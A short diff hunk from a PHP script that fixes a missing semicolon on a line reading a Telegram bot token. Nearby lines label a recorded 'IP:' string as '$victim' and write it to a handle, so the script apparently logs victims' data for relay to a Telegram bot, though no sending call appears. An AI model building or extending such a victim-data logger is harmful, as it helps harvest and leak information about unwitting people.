@@ -41,7 +41,7 @@ $victim = "IP: ";
 //$tgbot = getenv('TGBOT');
 //$tgchat = getenv('TGCHAT');
 
-$tgbot = getenv('TGBOT', true) ?: getenv('TGBOT')
+$tgbot = getenv('TGBOT', true) ?: getenv('TGBOT');
 
 
 fwrite($raw, $victim);
